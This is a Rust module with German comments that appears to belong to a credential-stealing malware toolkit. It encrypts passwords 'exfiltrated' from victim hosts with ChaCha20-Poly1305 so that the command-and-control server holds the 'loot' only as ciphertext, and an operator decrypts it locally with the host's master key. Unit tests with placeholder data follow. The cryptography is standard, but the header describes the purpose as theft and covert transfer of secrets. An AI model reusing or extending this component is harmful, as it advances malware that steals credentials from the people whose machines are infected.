//! AEAD-Wrapping für die exfiltrierten Secrets.
//!
//! Der Master-Key eines Hosts wird nie im Klartext transportiert. Das
//! Passwort wird mit ihm als AEAD-Schlüssel verschlüsselt, das Ergebnis geht
//! als base64 über die Leitung. Der Operator gewinnt den Master-Key aus dem
//! versiegelten Material des Hosts und entschlüsselt die Secrets lokal —
//! der C2-Server sieht die Beute nur verschlüsselt.
//!
//! Format: `kx1:` + base64(nonce (12 Byte) || ciphertext). Der Nonce ist
//! zufällig, der Schlüssel wird per HKDF aus dem Master-Key abgeleitet. Beides
//! — Präfix, Salt und Info-String — ist Teil des Formats und darf sich ohne
//! Versionswechsel nicht ändern.

use chacha20poly1305::aead::{Aead, KeyInit, Payload};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
use rand_core::{OsRng, RngCore};

use crate::error::{Error, Result};

/// Länge des Nonces — ChaCha20-Poly1305 nutzt 96 Bit.
pub const NONCE_LEN: usize = 12;

/// Präfix, damit ein versiegeltes Secret am Format erkennbar ist.
pub const SEALED_PREFIX: &str = "kx1:";

/// Info-String der Schlüsselableitung — Teil des Formats.
const KEY_INFO: &[u8] = b"kx/secretbox/v1";

/// Salt der Schlüsselableitung — Teil des Formats.
const KEY_SALT: &[u8] = b"kx-secretbox-salt-v1";

/// Leitet den AEAD-Schlüssel aus dem Master-Key ab.
fn aead_key(master_key: &[u8]) -> Result<[u8; 32]> {
    let mut key = [0u8; 32];
    crate::hostkey::hkdf_into(master_key, KEY_SALT, KEY_INFO, &mut key)
        .map_err(|e| Error::Crypto(format!("Secretbox-Schlüsselableitung: {e}")))?;
    Ok(key)
}

/// Verschlüsselt Klartext mit dem Master-Key eines Hosts.
///
/// Das Ergebnis ist `kx1:` + base64(nonce || ciphertext).
pub fn seal(master_key: &[u8], plaintext: &[u8]) -> Result<String> {
    if master_key.is_empty() {
        return Err(Error::Crypto("Secretbox ohne Master-Key".into()));
    }
    let key = aead_key(master_key)?;
    let cipher = ChaCha20Poly1305::new(Key::from_slice(&key));

    let mut nonce_bytes = [0u8; NONCE_LEN];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher
        .encrypt(
            nonce,
            Payload {
                msg: plaintext,
                aad: KEY_INFO,
            },
        )
        .map_err(|_| Error::Crypto("Secretbox-Verschlüsselung fehlgeschlagen".into()))?;

    let mut gesammelt = Vec::with_capacity(NONCE_LEN + ciphertext.len());
    gesammelt.extend_from_slice(&nonce_bytes);
    gesammelt.extend_from_slice(&ciphertext);
    Ok(format!(
        "{SEALED_PREFIX}{}",
        crate::util::b64_encode(&gesammelt)
    ))
}

/// Entschlüsselt ein versiegeltes Secret mit dem Master-Key.
pub fn open(master_key: &[u8], sealed: &str) -> Result<String> {
    let roh = sealed
        .strip_prefix(SEALED_PREFIX)
        .ok_or_else(|| Error::Crypto("Secret ist nicht versiegelt (Präfix fehlt)".into()))?;
    let bytes = crate::util::b64_decode(roh)
        .map_err(|e| Error::Crypto(format!("Secretbox-Base64: {e}")))?;
    if bytes.len() <= NONCE_LEN {
        return Err(Error::Crypto("Secretbox-Payload zu kurz".into()));
    }

    let key = aead_key(master_key)?;
    let cipher = ChaCha20Poly1305::new(Key::from_slice(&key));
    let nonce = Nonce::from_slice(&bytes[..NONCE_LEN]);
    let plaintext = cipher
        .decrypt(
            nonce,
            Payload {
                msg: &bytes[NONCE_LEN..],
                aad: KEY_INFO,
            },
        )
        .map_err(|_| Error::Crypto("Secretbox-Entschlüsselung fehlgeschlagen".into()))?;

    String::from_utf8(plaintext)
        .map_err(|_| Error::Crypto("Secretbox-Payload ist kein UTF-8".into()))
}

/// Ist der Text ein versiegeltes Secret?
pub fn ist_versiegelt(text: &str) -> bool {
    text.starts_with(SEALED_PREFIX)
}

#[cfg(test)]
mod tests {
    use super::*;

    const MASTER: &[u8] = &[0x5au8; 32];

    #[test]
    fn der_roundtrip_liefert_den_klartext_zurueck() {
        let versiegelt = seal(MASTER, b"loremipsum").expect("Versiegelung");

        assert!(ist_versiegelt(&versiegelt));
        assert_eq!(
            open(MASTER, &versiegelt).expect("Entschlüsselung"),
            "loremipsum"
        );
    }

    #[test]
    fn der_klartext_steht_nicht_im_versiegelten_secret() {
        let versiegelt = seal(MASTER, b"loremipsum").expect("Versiegelung");

        assert!(!versiegelt.contains("loremipsum"));
        assert!(
            !crate::util::b64_decode(versiegelt.strip_prefix(SEALED_PREFIX).unwrap())
                .unwrap()
                .windows(10)
                .any(|fenster| fenster == b"loremipsum")
        );
    }

    #[test]
    fn ein_falscher_master_key_scheitert() {
        let versiegelt = seal(MASTER, b"loremipsum").expect("Versiegelung");

        let ergebnis = open(&[0x11u8; 32], &versiegelt);

        assert!(ergebnis.is_err());
    }

    #[test]
    fn ein_unversiegeltes_secret_wird_abgelehnt() {
        assert!(open(MASTER, "loremipsum").is_err());
        assert!(!ist_versiegelt("loremipsum"));
    }

    #[test]
    fn ohne_master_key_ist_keine_versiegelung_moeglich() {
        assert!(seal(&[], b"loremipsum").is_err());
    }

    #[test]
    fn zwei_versiegelungen_derselben_ngabe_unterscheiden_sich() {
        let a = seal(MASTER, b"loremipsum").expect("Versiegelung");
        let b = seal(MASTER, b"loremipsum").expect("Versiegelung");

        assert_ne!(a, b, "der Nonce muss pro Versiegelung zufällig sein");
    }
}
